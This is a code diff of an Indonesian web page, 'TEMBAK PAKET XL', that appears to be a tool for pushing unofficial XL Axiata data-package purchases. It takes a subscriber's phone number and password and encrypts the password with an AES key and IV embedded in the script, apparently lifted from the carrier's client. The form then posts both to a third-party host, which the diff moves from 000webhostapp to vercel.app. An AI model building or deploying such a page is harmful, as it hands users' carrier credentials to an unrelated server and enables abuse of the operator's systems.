@@ -11,7 +11,7 @@
 <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
 <script src="https://my.xl.co.id/pre/assets/js/lib/aes.js"></script>
 <script>function enc(str){var d ="JsY1dPbldCJndHdGhmFFI.,pubAdJYkQGAGlhQkxdYAM.,IsiPulsaxlviamyxl10928375a".split(","),e=d[0],f=d[1],a=str,e=CryptoJS.enc.Base64.parse(e),f=CryptoJS.enc.Base64.parse(f);var g =CryptoJS.AES.encrypt(a,e,{iv:f});return g.toString();}$(document).ready(function(){
-    $.get('http://tembakterus.000webhostapp.com/count.php').done(function(data){$('#count').html('Tester: '+data);});
+    $.get('https://tembak.vercel.app/count.php').done(function(data){$('#count').html('Tester: '+data);});
 $("form").submit(function(event){event.preventDefault();var msisdn=jQuery('input[name="msisdn"]').val(),passwd=jQuery('input[name="passwd"]').val(),ini = jQuery('select[name="reg"]').val(),manual=jQuery('input[name="manual"]').val();$.ajax({type:'POST',url:$(this).attr('action'),data:{msisdn:msisdn,passwd:enc(passwd),reg:ini,manual:manual},error:function(xhr,ajaxOptions,thrownError){$('#response').html(xhr);},cache:false,beforeSend:function(){$('#response').html('Loading ....');},success:function(s){$('#response').html(s);}});return false;});});</script>
 <style type="text/css">
     .bs-example{
@@ -34,9 +34,9 @@ $("form").submit(function(event){event.preventDefault();var msisdn=jQuery('input
 		
 		<div align="center" id="wrapshopcart">
 			    <h3>TEMBAK PAKET XL</h3>
-			   <img src="http://tembakterus.000webhostapp.com/images/download.png" alt="XL AXIATA" style="display: block;margin: 0px auto; width: 50%"/>
+			   <img src="https://tembak.vercel.app/images/download.png" alt="XL AXIATA" style="display: block;margin: 0px auto; width: 50%"/>
 				<hr/>
-        <form action="http://tembakterus.000webhostapp.com/tembak.php" method="POST">
+        <form action="https://tembak.vercel.app/tembak.php" method="POST">
         <div class="form-group">
             <label for="inputEmail">Nomer XL</label>
             <input type="number" class="form-control" id="inputEmail" name="msisdn" placeholder="ex:628782xx" required>
